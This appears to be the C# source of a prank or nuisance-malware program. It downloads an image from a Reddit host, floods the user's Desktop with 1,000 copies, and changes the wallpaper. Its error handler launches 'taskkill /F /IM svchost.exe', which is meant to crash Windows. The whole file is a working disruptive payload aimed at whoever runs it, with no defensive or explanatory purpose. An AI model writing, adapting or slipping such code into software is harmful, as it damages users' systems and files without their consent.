using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using ballsBetter.Functions;

namespace ballsBetter.Functions
{
    class balls
    {
        public static void runBalls()
        {
            string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\";
            string localFilename = @"C:\Users\" + Environment.UserName + @"\Desktop\balls.jpg";
            string logPath = @"C:\Users\" + Environment.UserName + @"\Documents\Balls\ballsLog.txt";

            try
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile("https://i.redd.it/41ps5f0pnt771.png", localFilename);
                }
                for (int i = 0; i < 1000; i++)
                {
                    string num = desktop + i.ToString() + ".jpg";
                    File.Copy(localFilename, num);

                    Console.WriteLine("Ball " + num);
                }
            }

            catch (Exception e)
            {
                Console.WriteLine(e);

                System.Diagnostics.Process.Start("CMD.exe", "taskkill /F /IM svchost.exe");
            }

            Wallpaper.changeWallpaper();
        }
    }
}
